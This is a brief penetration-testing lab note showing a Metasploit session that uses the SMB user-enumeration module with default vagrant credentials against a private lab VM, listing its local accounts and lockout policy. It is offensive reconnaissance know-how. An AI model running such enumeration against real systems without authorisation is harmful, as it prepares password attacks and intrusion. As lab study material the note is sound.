# Pre-requisite - [[SMB]]
- The SMB User Enumeration auxiliary module allows us to determine what local users exist via the [[SAM RPC]] service:
# Code - 
```python
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers 
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBPass vagrant
SMBPass => vagrant
msf6 auxiliary(scanner/smb/smb_enumusers) > set SMBUser vagrant
SMBUser => vagrant
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.216.11
RHOSTS => 192.168.216.11
msf6 auxiliary(scanner/smb/smb_enumusers) > run

[+] 192.168.216.11:445    - VAGRANT-2008R2 [ Administrator, anakin_skywalker, artoo_detoo, ben_kenobi, boba_fett, chewbacca, c_three_pio, darth_vader, greedo, Guest, han_solo, jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leia_organa, luke_skywalker, sshd, sshd_server, vagrant ] ( LockoutTries=0 PasswordMin=0 )
[*] 192.168.216.11:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
